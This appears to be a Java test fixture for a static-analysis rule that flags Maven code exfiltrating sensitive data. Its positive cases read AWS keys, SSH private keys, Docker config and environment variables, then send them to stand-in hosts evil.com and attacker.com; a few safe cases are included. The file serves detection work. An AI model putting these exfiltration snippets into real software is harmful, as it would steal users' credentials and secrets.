import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import org.apache.http.client.*;
import org.apache.http.impl.client.*;
import org.apache.http.client.methods.*;
import org.apache.http.entity.*;
import okhttp3.*;
import org.springframework.web.client.*;
import org.springframework.http.*;

public class MavenExfiltrateSensitiveDataTest {

    public void testEnvironmentVariableExfiltration() throws Exception {
        String awsKey = System.getenv("AWS_ACCESS_KEY_ID");
        HttpURLConnection conn = (HttpURLConnection) new URL("http://evil.com").openConnection();
        // ruleid: maven-exfiltrate-sensitive-data
        conn.getOutputStream().write(awsKey.getBytes());
    }

    public void testSystemPropertyExfiltration() throws Exception {
        String username = System.getProperty("user.name");
        Socket socket = new Socket("attacker.com", 80);
        // ruleid: maven-exfiltrate-sensitive-data
        socket.getOutputStream().write(username.getBytes());
    }

    public void testFileExfiltration() throws Exception {
        String credentials = Files.readString(Paths.get("/home/user/.aws/credentials"));
        HttpClient client = HttpClients.createDefault();
        HttpPost request = new HttpPost("http://evil.com");
        // ruleid: maven-exfiltrate-sensitive-data
        request.setEntity(new StringEntity(credentials));
        // ruleid: maven-exfiltrate-sensitive-data
        client.execute(request);
    }

    public void testHostnameExfiltration() throws Exception {
        String hostname = InetAddress.getLocalHost().getHostName();
        RestTemplate rest = new RestTemplate();
        // ruleid: maven-exfiltrate-sensitive-data
        rest.postForObject("http://attacker.com", hostname, String.class);
    }

    public void testMultipleSourcesExfiltration() throws Exception {
        String env = System.getenv("SECRET_KEY");
        String home = System.getProperty("user.home");
        String combined = env + ":" + home;
        
        OkHttpClient client = new OkHttpClient();
        // ruleid: maven-exfiltrate-sensitive-data
        RequestBody body = RequestBody.create(combined, MediaType.parse("text/plain"));
        Request request = new Request.Builder()
            .url("http://evil.com")
            .post(body)
            .build();
        // ruleid: maven-exfiltrate-sensitive-data
        client.newCall(request).execute();
    }

    public void testSshKeyExfiltration() throws Exception {
        String sshKey = Files.readString(Paths.get("/home/user/.ssh/id_rsa"));
        PrintWriter writer = new PrintWriter(new Socket("attacker.com", 443).getOutputStream());
        // ruleid: maven-exfiltrate-sensitive-data
        writer.println(sshKey);
    }

    public void testDockerConfigExfiltration() throws Exception {
        String dockerConfig = Files.readString(Paths.get("/home/user/.docker/config.json"));
        // ruleid: maven-exfiltrate-sensitive-data
        System.out.println("Sending to attacker: " + dockerConfig);
    }

    public void testProcessEnvExfiltration() throws Exception {
        Process proc = Runtime.getRuntime().exec("env");
        BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        String envOutput = reader.readLine();
        
        HttpURLConnection conn = (HttpURLConnection) new URL("http://evil.com").openConnection();
        // ruleid: maven-exfiltrate-sensitive-data
        conn.setRequestProperty("Authorization", "Bearer " + envOutput);
    }

    // ok: maven-exfiltrate-sensitive-data
    public void testSafeEnvironmentUsage() {
        String path = System.getenv("PATH");
        System.out.println("PATH: " + path);
    }

    // ok: maven-exfiltrate-sensitive-data
    public void testSafeFileReading() throws Exception {
        String config = Files.readString(Paths.get("/app/config.properties"));
        System.out.println("Config loaded: " + config.length() + " bytes");
    }

    // ok: maven-exfiltrate-sensitive-data
    public void testSafeNetworkUsage() throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL("http://api.example.com").openConnection();
        conn.getOutputStream().write("Hello World".getBytes());
    }

    // ok: maven-exfiltrate-sensitive-data
    public void testSafeSystemInfo() {
        String javaVersion = System.getProperty("java.version");
        System.out.println("Java version: " + javaVersion);
    }

    // ok: maven-exfiltrate-sensitive-data
    public void testSafeHttpRequest() throws Exception {
        RestTemplate rest = new RestTemplate();
        // ok: maven-exfiltrate-sensitive-data
        rest.postForObject("http://api.example.com", "public data", String.class);
    }
} 